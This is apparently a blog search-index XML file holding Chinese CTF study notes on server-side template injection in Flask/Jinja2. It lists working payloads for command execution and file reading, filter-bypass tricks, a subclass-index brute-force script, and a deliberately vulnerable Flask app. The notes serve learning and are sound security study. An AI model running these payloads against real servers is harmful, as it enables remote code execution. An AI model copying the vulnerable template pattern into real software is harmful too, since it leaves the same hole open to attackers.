<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>SSTI模板注入</title>
    <link href="/tuyi/2025/01/15/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"/>
    <url>/tuyi/2025/01/15/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<p>一点关于ssti的学习笔记</p><p>不会就试试<strong>fenjing一把梭哈</strong></p><h1 id="常见payload"><a href="#常见payload" class="headerlink" title="常见payload"></a>常见payload</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-number">1</span>、任意命令执行<br>&#123;%<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()%&#125;&#123;%<span class="hljs-keyword">if</span> i.__name__ ==<span class="hljs-string">&#x27;_wrap_close&#x27;</span>%&#125;&#123;%<span class="hljs-built_in">print</span> i.__init__.__globals__[<span class="hljs-string">&#x27;popen&#x27;</span>](<span class="hljs-string">&#x27;dir&#x27;</span>).read()%&#125;&#123;%endif%&#125;&#123;%endfor%&#125;<br><span class="hljs-number">2</span>、任意命令执行<br>&#123;&#123;<span class="hljs-string">&quot;&quot;</span>.__class__.__bases__[<span class="hljs-number">0</span>]. __subclasses__()[<span class="hljs-number">138</span>].__init__.__globals__[<span class="hljs-string">&#x27;popen&#x27;</span>](<span class="hljs-string">&#x27;cat /flag&#x27;</span>).read()&#125;&#125;<br>//这个<span class="hljs-number">138</span>对应的类是os._wrap_close，只需要找到这个类的索引就可以利用这个payload<br><span class="hljs-number">3</span>、任意命令执行<br>&#123;&#123;url_for.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;eval&#x27;</span>](<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;dir&#x27;).read()&quot;</span>)&#125;&#125;<br><span class="hljs-number">4</span>、任意命令执行<br>&#123;&#123;x.__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;eval&#x27;</span>](<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat flag&#x27;).read()&quot;</span>)&#125;&#125;<br>//x的含义是可以为任意字母，不仅仅限于x<br><span class="hljs-number">5</span>、任意命令执行<br>&#123;&#123;config.__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;eval&#x27;</span>](<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat flag&#x27;).read()&quot;</span>)&#125;&#125;<br><span class="hljs-number">6</span>、文件读取<br>&#123;&#123;x.__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>].<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>).read()&#125;&#125;<br>//x的含义是可以为任意字母，不仅仅限于x<br><span class="hljs-number">7.</span>任意命令执行<br>&#123;&#123;lipsum.__globals__[<span class="hljs-string">&#x27;os&#x27;</span>].popen(<span class="hljs-string">&#x27;cat /app/flag&#x27;</span>).read()&#125;&#125;<br><span class="hljs-number">8.</span>不出网写静态文件<br>&#123;&#123;lipsum.__globals__[<span class="hljs-string">&#x27;os&#x27;</span>].popen(<span class="hljs-string">&#x27;echo cat /app/flag &gt;/app/static/1.txt&#x27;</span>).read()&#125;&#125;<br><span class="hljs-number">9.</span>当config是<span class="hljs-literal">None</span>时，尝试读取current_app的config<br>&#123;&#123;url_for.__globals__[<span class="hljs-string">&#x27;current_app&#x27;</span>].config&#125;&#125;<br><br></code></pre></td></tr></table></figure><h1 id="常见方法"><a href="#常见方法" class="headerlink" title="常见方法"></a>常见方法</h1><p>获取键值或下标的方式</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs stylus">dict<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;__builtins__&#x27;</span>]</span><br>dict.<span class="hljs-built_in">__getitem__</span>(<span class="hljs-string">&#x27;__builtins__&#x27;</span>)<br>dict<span class="hljs-selector-class">.pop</span>(<span class="hljs-string">&#x27;__builtins__&#x27;</span>)<br>dict<span class="hljs-selector-class">.get</span>(<span class="hljs-string">&#x27;__builtins__&#x27;</span>)<br>dict<span class="hljs-selector-class">.setdefault</span>(<span class="hljs-string">&#x27;__builtins__&#x27;</span>)<br>list<span class="hljs-selector-attr">[0]</span><br>list.<span class="hljs-built_in">__getitem__</span>(<span class="hljs-number">0</span>)<br>list<span class="hljs-selector-class">.pop</span>(<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><p>获取属性的方式</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">().<span class="hljs-emphasis">__class__</span><br>()[&quot;<span class="hljs-emphasis">__class__</span>&quot;]<br>()|attr(&quot;<span class="hljs-emphasis">__class__</span>&quot;)<br>().<span class="hljs-emphasis">__getattribute__</span>(&quot;<span class="hljs-emphasis">__class__</span>&quot;)<br></code></pre></td></tr></table></figure><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs clean">&#123;%%&#125;可以用来声明变量，当然也可以用于循环语句和条件语句。<br>&#123;&#123;&#125;&#125;用于将表达式打印到模板输出<br>&#123;##&#125;表示未包含在模板输出中的注释<br>\##可以有和&#123;%%&#125;相同的效果<br></code></pre></td></tr></table></figure>{%set%}拼接<figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs django"><span class="language-xml">c.构造popen</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%<span class="hljs-name">set</span> c=dict(po=a,pen=a)|<span class="hljs-name">join</span>%&#125;</span><br></code></pre></td></tr></table></figure><h1 id="1-什么是SSTI模板注入"><a href="#1-什么是SSTI模板注入" class="headerlink" title="1.什么是SSTI模板注入"></a>1.什么是SSTI模板注入</h1><p>SSTI，服务端模板注入，其实也就是模板引擎+注入, 那么我们首先需要了解一下模板引擎</p><p>模板只是一种提供给程序来解析的一种语法，换句话说，模板是用于从数据（变量）到实际的视觉表现（HTML代码）这项工作的一种实现手段，而这种手段不论在前端还是后端都有应用。</p><p>通俗点理解：拿到数据，塞到模板里，然后让渲染引擎将赛进去的东西生成 html 的文本，返回给浏览器，这样做的好处展示数据快，大大提升效率。也就是html框架</p><p>常见的模板引擎：</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-symbol">PHP:</span> Smarty, Twig, <span class="hljs-keyword">Blade</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">java: </span><span class="hljs-keyword">JSP, </span>FreeMarker, Velocity<br><span class="hljs-symbol">Python:</span> <span class="hljs-keyword">Jinja2, </span>django, tornado<br></code></pre></td></tr></table></figure><p>简单的ssti</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask,request,render_template_string<br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    name = request.args.get(<span class="hljs-string">&#x27;name&#x27;</span>)<br>    template = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">&lt;html&gt;</span><br><span class="hljs-string">  &lt;head&gt;</span><br><span class="hljs-string">    &lt;title&gt;SSTI&lt;/title&gt;</span><br><span class="hljs-string">  &lt;/head&gt;</span><br><span class="hljs-string"> &lt;body&gt;</span><br><span class="hljs-string">      &lt;h3&gt;Hello, %s !&lt;/h3&gt;</span><br><span class="hljs-string">  &lt;/body&gt;</span><br><span class="hljs-string">&lt;/html&gt;</span><br><span class="hljs-string">        &#x27;&#x27;&#x27;</span>% (name)<br>    <span class="hljs-keyword">return</span> render_template_string(template)<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.run(host=<span class="hljs-string">&quot;0.0.0.0&quot;</span>, port=<span class="hljs-number">8888</span>, debug=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure>当我们输入name是可控的,使用的是%S来实现动态的字符串控制，而Flask使用的是jinja2模板，我们可以传入{{}}，`{{}}`在`Jinja2`中作为变量包裹标识符，`Jinja2`在渲染的时候会把{{}}包裹的内容进行解析，就可以执行命令。<h1 id="2-SSTI前置知识"><a href="#2-SSTI前置知识" class="headerlink" title="2.SSTI前置知识"></a>2.SSTI前置知识</h1><p>主要了解一点Python的魔术方法和内置类</p><p><code>__class__</code>用于返回该对象所属的类<br>示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&#x27;abcd&#x27;</span>.__class__<br>&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;str&#x27;</span>&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span>().__class__<br>&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;tuple&#x27;</span>&gt;<br></code></pre></td></tr></table></figure><p><code>__base__</code>用于获取类的基类<br>示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&quot;&quot;</span>.__class__<br>&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;str&#x27;</span>&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&quot;&quot;</span>.__class__.__base__<br>&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;object&#x27;</span>&gt;<br>//<span class="hljs-built_in">object</span>为<span class="hljs-built_in">str</span>的基类<br></code></pre></td></tr></table></figure><p><code>__mro__</code>返回解析方法调用的顺序的元组。（当调用_mro_[1]或者-1时作用其实等同于_base_）<br>示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&quot;&quot;</span>.__class__.__mro__<br>(&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;str&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;object&#x27;</span>&gt;)<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&quot;&quot;</span>.__class__.__mro__[<span class="hljs-number">1</span>]<br>&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;object&#x27;</span>&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&quot;&quot;</span>.__class__.__mro__[-<span class="hljs-number">1</span>]<br>&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;object&#x27;</span>&gt;<br></code></pre></td></tr></table></figure><p><code>__subclasses__()</code>可以获取类的所有子类的元组<br>示例</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&quot;&quot;</span>.__class__.__mro__[-<span class="hljs-number">1</span>].__subclasses__()<br>[&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;type&#x27;</span>&gt;,&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;dict_keys&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;dict_values&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;dict_items&#x27;</span>&gt;...]<br></code></pre></td></tr></table></figure><p><code>__init__</code><br>重载子类，获取子类初始化的属性。</p><p><code>__globals__</code><br>函数会以字典的形式返回当前位置的全部全局变量<br>就比如：<code>os._wrap_close.__init__.__globals__</code>，可以获取到os中的一些函数，进行文件读取</p><h1 id="3-SSTI语句构造"><a href="#3-SSTI语句构造" class="headerlink" title="3.SSTI语句构造"></a>3.SSTI语句构造</h1><p>第一步，拿到当前类，也就是用__class__</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">name</span><span class="hljs-operator">=</span>&#123;&#123;<span class="hljs-string">&quot;&quot;</span>.__class__&#125;&#125;<br></code></pre></td></tr></table></figure><p>第二步，拿到基类，这里可以用__base__，也可以用__mro__</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">name=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&quot;&quot;.__class__.__bases__</span>[0]&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">或</span><br><span class="language-xml">name=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&quot;&quot;.__class__.__mro__</span>[1]&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">或</span><br><span class="language-xml">name=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&quot;&quot;.__class__.__mro__</span>[-1]&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>第三步，拿到基类的子类，用<code>__subclasses__()</code></p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">name=&#123;&#123;<span class="hljs-string">&quot;&quot;</span>.__class__.__bases__[<span class="hljs-number">0</span>]. __subclasses__()&#125;&#125;<br>[&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;type&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;weakref&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;weakcallableproxy&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;weakproxy&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;int&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;bytearray&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;bytes&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;list&#x27;</span>&gt;, <br></code></pre></td></tr></table></figure><p>接下来的话，就要找可利用的类，寻找那些有回显的或者可以执行命令的类<br>大多数利用的是<code>os._wrap_close</code>这个类，我们这里可以用一个简单脚本来寻找它对应的下标</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>headers = &#123;<br>    <span class="hljs-string">&#x27;User-Agent&#x27;</span>:<span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36&#x27;</span>&#125;<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">500</span>):<br>    url = <span class="hljs-string">&quot;http://127.0.0.1:8888/?name=\</span><br><span class="hljs-string">        &#123;&#123;().__class__.__bases__[0].__subclasses__()[&quot;</span>+<span class="hljs-built_in">str</span>(i)+<span class="hljs-string">&quot;]&#125;&#125;&quot;</span><br>    res = requests.get(url=url, headers=headers)<br>    <span class="hljs-comment">#print(res.text)</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;os._wrap_close&#x27;</span> <span class="hljs-keyword">in</span> res.text:<br>        <span class="hljs-built_in">print</span>(i)<br></code></pre></td></tr></table></figure><p>接下来就可以利用<code>os。_wrap_close</code>，这个类中有<code>popen</code>方法，我们去调用它<br>首先<br>先调用它的__init__方法进行初始化类</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">name=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&quot;&quot;.__class__.__bases__</span>[0]. __subclasses__()[138].__init__&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>然后再调用__globals__获取到方法内以字典的形式返回的方法、属性等</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">name=&#123;&#123;<span class="hljs-string">&quot;&quot;</span>.__class__.__bases__[<span class="hljs-number">0</span>]. __subclasses__()[<span class="hljs-number">138</span>].__init__.__globals__&#125;&#125;<br></code></pre></td></tr></table></figure><p>此时就可以去进行RCE了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">name=&#123;&#123;<span class="hljs-string">&quot;&quot;</span>.__class__.__bases__[<span class="hljs-number">0</span>]. __subclasses__()[<span class="hljs-number">138</span>].__init__.__globals__[<span class="hljs-string">&#x27;popen&#x27;</span>](<span class="hljs-string">&#x27;dir&#x27;</span>).read()&#125;&#125;<br></code></pre></td></tr></table></figure><p>还有一个比较厉害的模块，就是<code>__builtins__</code>,它里面有<code>eval()</code>等函数，我们可以也利用它来进行RCE<br>它的payload是</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;url_for.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;eval&#x27;</span>](<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;dir&#x27;).read()&quot;</span>)&#125;&#125;<br></code></pre></td></tr></table></figure><h1 id="4-SSTI常见的绕过方式"><a href="#4-SSTI常见的绕过方式" class="headerlink" title="4.SSTI常见的绕过方式"></a>4.SSTI常见的绕过方式</h1><h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过  ."></a>绕过  .</h2><p>当.被ban时，有以下几种绕过方式</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">1、用[]代替.</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&quot;&quot;.__class__</span>&#125;&#125;</span><span class="language-xml">=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&quot;&quot;</span>[&#x27;__class&#x27;]&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">2、用attr()过滤器绕过</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&quot;&quot;.__class__</span>&#125;&#125;</span><span class="language-xml">=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&quot;&quot;</span>|attr(<span class="hljs-name">&#x27;__class__&#x27;</span>)&#125;&#125;</span><br></code></pre></td></tr></table></figure><h2 id="绕过-1"><a href="#绕过-1" class="headerlink" title="绕过 _"></a>绕过 _</h2><p>当<code>_</code>被ban时，有以下几种绕过方式</p><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs twig"><span class="language-xml">1、通过list获取字符列表，然后用pop来获取_</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> a=(()<span class="hljs-punctuation">|</span>select<span class="hljs-punctuation">|</span>string<span class="hljs-punctuation">|</span>list).pop(<span class="hljs-number">24</span>)<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">print</span>(a)<span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml">2、可以通过字符编码的方式进行绕过，举个16进制编码例子 可以编码绕过 python解析器支持 hex ，unicode编码</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;()[<span class="hljs-string">&quot;\x5f\x5fclass\x5f\x5f&quot;</span>]&#125;&#125;</span><span class="language-xml"> =</span><span class="hljs-template-variable">&#123;&#123;().__class__&#125;&#125;</span><br></code></pre></td></tr></table></figure>使用{%set%}构造下划线<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs vim">&#123;% <span class="hljs-keyword">set</span> <span class="hljs-keyword">sb</span> = dict(aaaaaaaaaaaaaaaaaa=<span class="hljs-keyword">a</span>) | <span class="hljs-keyword">join</span> | <span class="hljs-built_in">count</span> %&#125;<br>&#123;% <span class="hljs-keyword">set</span> <span class="hljs-keyword">pop</span>=dict(<span class="hljs-keyword">pop</span>=<span class="hljs-keyword">a</span>)|<span class="hljs-keyword">join</span>%&#125;<br>&#123;% <span class="hljs-keyword">set</span> xiahuaxian = (lipsum | <span class="hljs-built_in">string</span> | <span class="hljs-keyword">list</span>) | attr(<span class="hljs-keyword">pop</span>)(<span class="hljs-keyword">sb</span>) %&#125;<br><br>小标按照实际情况写<br></code></pre></td></tr></table></figure><h2 id="绕过-2"><a href="#绕过-2" class="headerlink" title="绕过 []"></a>绕过 []</h2><p>经常有中括号被ban的情况出现，这个时候可以使用<code>pop</code>或<code>__getitem__()</code>代替索引中的&#96;[]，它的作用简单说就是可以把中括号转换为括号的形式，举个例子</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-emphasis">__bases__</span>[0]=<span class="hljs-emphasis">__bases__</span>.<span class="hljs-emphasis">__getitem__</span>(0)<br></code></pre></td></tr></table></figure>## 绕过{{}}有时候为了防止SSTI，可能程序员会ban掉{{，这个时候我们可以利用jinja2的语法，用{%来进行RCE，举个例子我们平常使用的payload<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&quot;&quot;.__class__.__bases__</span>[0]. __subclasses__()[138].__init__.__globals__[&#x27;popen&#x27;](<span class="hljs-name">&#x27;dir&#x27;</span>).read()&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>修改后的payload</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sqf">&#123;%print(<span class="hljs-string">&quot;&quot;</span>.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__bases__</span>[<span class="hljs-number">0</span>]. <span class="hljs-variable">__subclasses__</span>()[<span class="hljs-number">138</span>].<span class="hljs-variable">__init__</span>.<span class="hljs-variable">__globals__</span>[<span class="hljs-string">&#x27;popen&#x27;</span>](<span class="hljs-string">&#x27;dir&#x27;</span>).read())%&#125;<br></code></pre></td></tr></table></figure><p>也可以借助for循环和if语句来执行命令</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">&#123;%for i <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()%&#125;&#123;%if i.__name__ ==<span class="hljs-string">&#x27;_wrap_close&#x27;</span>%&#125;&#123;%print i.__init__.__globals__[<span class="hljs-string">&#x27;popen&#x27;</span>](<span class="hljs-string">&#x27;dir&#x27;</span>).read()%&#125;&#123;%endif%&#125;&#123;%endfor%&#125;<br></code></pre></td></tr></table></figure><h2 id="绕过单引号双引号-传参绕过"><a href="#绕过单引号双引号-传参绕过" class="headerlink" title="绕过单引号双引号   传参绕过"></a>绕过单引号双引号   传参绕过</h2><p>过滤了单、双引号，有两种方法绕过</p><p>request绕过</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">#post</span><br><span class="language-xml"># __builtins__</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;()<span class="hljs-name">.__class__.__base__.subclasses__</span>()[80].__init__.__globals__.__builtins__[request.values.arg1](<span class="hljs-name">request.values.arg2</span>).popen(<span class="hljs-name">request.values.arg3</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">POST:arg1=__import__,arg2=os,arg3=popen</span><br><span class="language-xml"></span><br><span class="language-xml"># popen</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;()<span class="hljs-name">.__class__.__base__.subclasses__</span>()[132].__init__.__globals__[request.values.arg1](<span class="hljs-name">request.values.arg2</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">POST:arg1=popen,arg2=cat flag</span><br><span class="language-xml"></span><br><span class="language-xml"># os</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;()<span class="hljs-name">.__class__.__base__.subclasses__</span>()[213].__init__.__globals__[request.values.arg1].popen(<span class="hljs-name">request.values.arg2</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">POST:arg1=popen,arg2=cat flag</span><br><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">#cookie</span><br><span class="language-xml"># popen</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;()<span class="hljs-name">.__class__.__base__.subclasses__</span>()[132].__init__.__globals__[request.cookies.arg1](<span class="hljs-name">request.cookies.arg2</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">Cookie:arg1=popen,arg2=cat flag</span><br><span class="language-xml"></span><br></code></pre></td></tr></table></figure><p>chr()绕过</p><p>先找出chr函数位置</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">&#123;&#123;().<span class="hljs-emphasis">__class__</span>.<span class="hljs-emphasis">__mro__</span>[-1].<span class="hljs-emphasis">__subclasses__</span>()[0].<span class="hljs-emphasis">__init__</span>.<span class="hljs-emphasis">__globals__</span>.<span class="hljs-emphasis">__builtins__</span>.chr&#125;&#125;<br></code></pre></td></tr></table></figure>{%set%}拼接绕过   适合大部分过滤<h2 id="绕过args"><a href="#绕过args" class="headerlink" title="绕过args"></a>绕过args</h2><p>当使用args的方法绕过<code>&#39;</code>和<code>&quot;</code>时，可能遇见args被ban的情况，这个时候可以采用<code>request.cookies</code>和<code>request.values</code>，他们利用的方式大同小异，示例如下</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">GET:&#123;&#123;url_for.__globals__<span class="hljs-selector-attr">[request.cookies.a]</span>&#125;&#125;<br>COOkie: <span class="hljs-string">&quot;a&quot;</span> :<span class="hljs-string">&#x27;__builtins__&#x27;</span><br></code></pre></td></tr></table></figure>使用{%set%}拼接绕过<h2 id="绕过数字"><a href="#绕过数字" class="headerlink" 